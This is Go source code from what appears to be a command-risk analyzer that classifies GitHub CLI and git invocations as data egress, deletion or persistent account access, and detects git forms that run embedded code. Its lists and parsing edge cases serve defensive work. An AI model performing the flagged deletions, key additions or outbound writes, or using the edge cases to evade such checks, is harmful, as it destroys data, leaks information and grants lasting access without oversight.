var ghWrite = map[string]map[string]bool{
	"issue":    set("create", "comment", "edit", "close", "reopen", "transfer"),
	"pr":       set("create", "comment", "edit", "review", "merge", "close"),
	"gist":     set("create", "edit"),
	"release":  set("create", "upload", "edit"),
	"repo":     set("create", "edit", "fork", "rename", "archive"),
	"secret":   set("set"),
	"variable": set("set"),
	"workflow": set("run", "enable"),
}

// ghDestroy: gh subcommands that delete data on GitHub (DESTROY).
// They are DESTROY, not EGRESS, so the destroy rule sees them.
var ghDestroy = map[string]map[string]bool{
	"repo":     set("delete"),
	"issue":    set("delete"),
	"gist":     set("delete"),
	"release":  set("delete", "delete-asset"),
	"secret":   set("delete", "remove"),
	"variable": set("delete"),
	"run":      set("delete"),
	"cache":    set("delete"),
	"label":    set("delete"),
	"ssh-key":  set("delete"),
	"gpg-key":  set("delete"),
	"project":  set("delete"),
}

// ghPersist: gh subcommands that grant lasting account access (PERSIST).
var ghPersist = map[string]map[string]bool{
	"ssh-key":    set("add"),
	"gpg-key":    set("add"),
	"auth":       set("refresh", "login"),
	"deploy-key": set("add"),
}

// sedFiles returns the files `sed -i` / `perl -i` edits. The script is the
// value of -e/-f (or --expression/--file), or else the first positional.
// With -e, the next argument is the script ('/^\t"flag"$/d'), not a file;
// read as a file, its "$" would make it a write to an unknown path.
func sedFiles(args []string) []string {
	var files []string
	script := false // a script came from -e/-f
	for i := 0; i < len(args); i++ {
		x := args[i]
		switch {
		case x == "--":
			files = append(files, args[i+1:]...)
			i = len(args)
		case x == "-e" || x == "--expression" || x == "-f" || x == "--file":
			script = true
			i++ // skip the value
		case strings.HasPrefix(x, "--expression=") || strings.HasPrefix(x, "--file="):
			script = true
		case strings.HasPrefix(x, "-") && len(x) > 1:
			// A cluster of short options (-ne, -i.bak, -pe): i ends it with
			// an attached backup suffix; e or f ends it with the script,
			// attached (-es/x/y/) or in the next argument (-ne 's/x/y/').
		cluster:
			for j := 1; j < len(x); j++ {
				switch x[j] {
				case 'i':
					break cluster
				case 'e', 'f':
					script = true
					if j == len(x)-1 {
						i++
					}
					break cluster
				}
			}
		default:
			files = append(files, x)
		}
	}
	if !script && len(files) > 0 {
		files = files[1:] // the first positional is the script
	}
	var out []string
	for _, f := range files {
		if f != "" {
			out = append(out, f)
		}
	}
	return out
}

// gitRunsCode reports git calls that run a command given as an argument:
// an alias defined with -c alias.X=…, submodule foreach, bisect run,
// rebase --exec/-x, and filter-branch filters. It returns the arguments
// as text, so callers can search them like other inline code.
func gitRunsCode(global []string, sub string, rest, pos []string) (string, bool) {
	all := strings.Join(rest, " ")
	for j, g := range global {
		if g == "-c" && j+1 < len(global) && strings.HasPrefix(strings.ToLower(global[j+1]), "alias.") {
			return strings.Join(global[j+1:], " ") + " " + sub + " " + all, true
		}
	}
	switch {
	case sub == "submodule" && slices.Contains(pos, "foreach"),
		sub == "bisect" && len(pos) > 0 && pos[0] == "run",
		sub == "filter-branch":
		return all, true
	case sub == "rebase":
		for _, x := range rest {
			if x == "-x" || x == "--exec" || strings.HasPrefix(x, "--exec=") {
				return all, true
			}
		}
	}
	return "", false
}

// gitCodeWords: with these, a later -h or --help belongs to the command git
// runs, not to git.
var gitCodeWords = set("foreach", "run", "--exec", "-x", "filter-branch")

// helpOnly reports whether a git or gh call only prints help: --help or -h
// right after a subcommand word. After an option it may be that option's
// value (`gh pr create --body --help` creates a pull request), so it does
// not count there, nor after "--".
func helpOnly(args []string) bool {
	for i, x := range args {
		if x == "--" || gitCodeWords[x] || strings.HasPrefix(strings.ToLower(x), "alias.") {
			return false
		}
		if (x == "--help" || x == "-h") && i > 0 && !strings.HasPrefix(args[i-1], "-") {
			return true
		}
	}
	return false
}

func ghCmd(a *Analysis, args []string) {
	if p := positional(args); len(p) >= 3 && p[0] == "repo" && p[1] == "deploy-key" && p[2] == "add" {
		a.sink(Persist, "gh_deploy_key_add", "")
		return
	}
	pos := positional(args)
	if len(pos) == 0 {
		return
	}
	if pos[0] == "api" {
		target := ""
		for _, p := range pos[1:] {
			if strings.Contains(p, "/") || strings.Contains(p, "graphql") {
				target = p // the endpoint, not the value of -X
				break
			}
		}
		switch m := apiMethod(args); {
		case m == "DELETE":
			a.sink(Destroy, "gh_api_delete", target)
		case m != "GET" || hasFlag(args, 'f', "--field", "--raw-field", "--input") || hasFlag(args, 'F'):
			a.sink(Egress, "gh_api_write", target)
		}
		return
	}
	if len(pos) < 2 {
		return
	}
	target := strings.Join(pos[2:], " ")
	if ghPersist[pos[0]][pos[1]] {
		a.sink(Persist, "gh_"+pos[0]+"_"+pos[1], target)
		return
	}
	if ghDestroy[pos[0]][pos[1]] {
		a.sink(Destroy, "gh_"+pos[0]+"_"+pos[1], target)
		return
	}
	if ghWrite[pos[0]][pos[1]] {
		target := ""
		if ghRepoScoped[pos[0]] && !ghNeverOwn[pos[0]+" "+pos[1]] && !ghReadsFiles(args) {
			target = GHRepoTarget(ghTargetRepos(args, pos[2:]))
		}
		a.sink(Egress, "gh_"+pos[0]+"_"+pos[1], target)
	}
}

// ghRepoScoped: gh command groups whose writes go to one repository, either
// the -R/--repo flag or the repository of the current folder.
var ghRepoScoped = map[string]bool{
	"issue": true, "pr": true, "release": true, "secret": true, "repo": true,
}

// ghNeverOwn: writes that are never "data staying in your repository",
// because they create a new place (repo create/fork), move data to another
// repository (issue transfer), publish files or change who can read
// (release create/upload/edit, repo edit/rename/archive). Variables and
// workflow inputs are readable by collaborators and in run logs, so the
// variable and workflow groups are not repo-scoped at all.
var ghNeverOwn = map[string]bool{
	"repo create": true, "repo fork": true, "repo edit": true, "repo rename": true, "repo archive": true,
	"issue transfer": true, "release create": true, "release upload": true, "release edit": true,
}

// ghFileFlags read a file into what gh sends (a body, release notes, saved
// input). Rule 1 cannot see a secret inside a file, so such calls get no
// exemption.
var ghFileFlags = map[string]bool{"--body-file": true, "--notes-file": true, "--recover": true, "--input": true}

// ghReadsFiles: the call reads a file into what it sends, or builds part of
// it at run time ($(cat …), "$x", PowerShell (Get-Content …)).
func ghReadsFiles(args []string) bool {
	for _, x := range args {
		if x == "--" {
			return false
		}
		name, _, _ := strings.Cut(x, "=")
		if ghFileFlags[name] || strings.ContainsAny(x, "$`") || strings.HasPrefix(x, "(") || strings.HasPrefix(x, "@(") {
			return true
		}
		// -F is --body-file for issue/pr; also inside a cluster (-dF).
		if len(x) > 1 && x[0] == '-' && x[1] != '-' && strings.ContainsRune(x[1:], 'F') {
			return true
		}
	}
	return false
}

// GHRepoPrefix marks a sink target that lists the repositories a gh command
// may write to, separated by spaces: "OWNER/REPO", "." for the current
// folder's repository, "@DIR" for the repository in DIR (after a cd in the
// same command), or "?" when it is not known before run time. The call
// stays in your repository only if every listed one is yours.
const GHRepoPrefix = "gh-repo:"

// GHRepoTarget builds the sink target ("" in repos = the current folder).
func GHRepoTarget(repos []string) string {
	if len(repos) == 0 {
		return GHRepoPrefix + "."
	}
	out := make([]string, 0, len(repos))
	for _, r := range repos {
		switch {
		case r == "":
			r = "."
		case strings.ContainsAny(r, "$`(){} \t"):
			r = "?" // set at run time, or not a repository name
		}
		out = append(out, r)
	}
	return GHRepoPrefix + strings.Join(out, " ")
}

var ghRefRe = regexp.MustCompile(`^[A-Za-z0-9-]+/[A-Za-z0-9_.-]+#[0-9]+$`)

// ghTargetRepos lists every repository the call may write to: each -R
// value (pflag uses the last, but all must be yours), and each issue or
// pull request given as a link or as OWNER/REPO#N. A link in a message body
// is listed too: that costs a false alarm, never a leak. Link arguments
// (gh issue comment <url>) and -R inside a cluster (-dR) count.
func ghTargetRepos(args, operands []string) []string {
	var repos []string
	for i := 0; i < len(args); i++ {
		x := args[i]
		switch {
		case x == "--":
			i = len(args)
		case x == "--repo" || x == "-R":
			if i+1 < len(args) {
				repos = append(repos, args[i+1])
				i++
			} else {
				repos = append(repos, "?")
			}
		case strings.HasPrefix(x, "--repo="):
			repos = append(repos, strings.TrimPrefix(x, "--repo="))
		case len(x) > 1 && x[0] == '-' && x[1] != '-':
			if j := strings.IndexByte(x, 'R'); j > 0 {
				if v := x[j+1:]; v != "" {
					repos = append(repos, v)
				} else if i+1 < len(args) {
					repos = append(repos, args[i+1])
					i++
				} else {
					repos = append(repos, "?")
				}
			}
		}
	}
	explicit := len(repos) > 0
	for _, o := range operands {
		if r, ok := ghRepoOfRef(o); ok {
			repos = append(repos, r)
		}
	}
	if !explicit {
		repos = append(repos, "") // gh's default: the current folder's repository
	}
	return repos
}

// ghRepoOfRef reads OWNER/REPO from an issue or pull request link
// (https://github.com/OWNER/REPO/issues/1) or OWNER/REPO#N. A link to
// another host gives "?".
func ghRepoOfRef(s string) (string, bool) {
	if ghRefRe.MatchString(s) {
		return s[:strings.IndexByte(s, '#')], true
	}
	l := strings.ToLower(s)
	if !strings.Contains(l, "://") && !strings.Contains(l, "github.com/") {
		return "", false
	}
	if _, rest, ok := strings.Cut(s, "://"); ok {
		s = rest
	}
	host, p, _ := strings.Cut(s, "/")
	if h := strings.ToLower(host); h != "github.com" && h != "www.github.com" {
		return "?", true
	}
	seg := strings.Split(p, "/")
	if len(seg) < 2 || seg[0] == "" || seg[1] == "" {
		return "?", true
	}
	return seg[0] + "/" + seg[1], true
}

// apiMethod returns the upper-case HTTP method of a `gh api` call (default GET).
func apiMethod(args []string) string {
	for i, x := range args {
		if (x == "-X" || x == "--method") && i+1 < len(args) {
			return strings.ToUpper(args[i+1])
		}
		if v, ok := strings.CutPrefix(x, "--method="); ok {
			return strings.ToUpper(v)
		}
	}
	return "GET"
}
